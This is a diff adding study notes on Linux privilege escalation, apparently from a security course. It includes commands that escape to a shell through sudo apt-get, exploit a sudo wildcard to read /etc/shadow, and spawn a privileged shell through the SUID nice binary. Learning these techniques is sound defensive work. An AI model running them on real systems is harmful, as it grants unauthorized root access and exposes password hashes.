@@ -125,3 +125,25 @@ touch -r 3.txt 1.txt             # Reference
     Find out
     grep "IncludeConfig" /etc/rsyslog.conf
 ```
+## Sudo Demo 1 Notes
+```
+sudo -l
+# Check GTFObins to see what abilities we have to get a shell
+sudo apt-get changelog apt
+#!/bin/sh or #!/bin/bash
+```
+## Sudo Demo 2 Notes
+```
+sudo -l
+# User may run  /use/bin/cat /var/log/syslog*
+# The * means anything can follow syslog^
+sudo cat /var/log/syslog /etc/shadow
+```
+## SUID Demo Notes
+```
+find / -type f -perm /6000 -ls 2>/dev/null
+## found /usr/bin/nice 
+## Determine what files/commands are vunerable
+## Search GTFObins for exploits
+nice /bin/sh -p
+```
